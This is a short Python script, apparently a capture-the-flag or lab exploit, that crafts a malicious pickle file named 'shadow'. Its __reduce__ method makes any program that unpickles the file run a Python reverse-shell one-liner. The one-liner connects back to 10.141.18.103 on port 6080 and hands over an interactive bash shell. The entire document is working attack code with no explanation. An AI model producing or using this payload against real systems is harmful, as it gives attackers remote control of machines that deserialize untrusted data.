import pickle
import commands

class exp(object):
    def __reduce__(self):

        s = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.141.18.103",6080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'"""
        return (commands.getoutput, (s,))

e = exp()

pick = open("shadow", "wb")


s = pickle.dump(e, pick)